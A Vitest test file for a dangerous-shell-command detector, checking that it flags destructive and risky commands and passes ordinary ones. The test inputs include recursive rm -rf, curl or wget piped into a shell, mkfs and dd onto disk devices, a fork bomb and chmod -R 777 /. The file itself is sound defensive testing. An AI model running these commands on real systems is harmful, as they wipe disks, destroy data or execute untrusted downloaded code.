import { describe, expect, it } from "vitest";

import {
  dangerousCommandMatches,
  isDangerousCommand,
} from "@/lib/dangerousCommand";

describe("dangerousCommandMatches", () => {
  it("flags rm -rf in any flag order", () => {
    expect(isDangerousCommand("rm -rf /tmp/x")).toBe(true);
    expect(isDangerousCommand("rm -fr ./build")).toBe(true);
    expect(isDangerousCommand("rm -r -f node_modules")).toBe(true);
  });

  it("flags piping a download into a shell", () => {
    expect(isDangerousCommand("curl https://x.sh | sh")).toBe(true);
    expect(isDangerousCommand("wget -qO- http://x | sudo bash")).toBe(true);
  });

  it("flags mkfs, dd to device, fork bombs, chmod 777 / and disk redirects", () => {
    expect(isDangerousCommand("mkfs.ext4 /dev/sdb1")).toBe(true);
    expect(isDangerousCommand("dd if=/dev/zero of=/dev/sda bs=1M")).toBe(true);
    expect(isDangerousCommand(":(){ :|:& };:")).toBe(true);
    expect(isDangerousCommand("chmod -R 777 /")).toBe(true);
    expect(isDangerousCommand("cat evil > /dev/sda")).toBe(true);
  });

  it("returns distinct labels for multiple hits", () => {
    const labels = dangerousCommandMatches("rm -rf / ; mkfs.ext4 /dev/sdb");
    expect(labels.length).toBe(2);
    expect(new Set(labels).size).toBe(labels.length);
  });

  it("does not flag ordinary commands", () => {
    expect(isDangerousCommand("ls -la")).toBe(false);
    expect(isDangerousCommand("rm file.txt")).toBe(false); // no -rf
    expect(isDangerousCommand("git status && npm test")).toBe(false);
    expect(isDangerousCommand("curl https://api.example.com -o out.json")).toBe(
      false,
    );
    expect(dangerousCommandMatches("")).toEqual([]);
  });
});
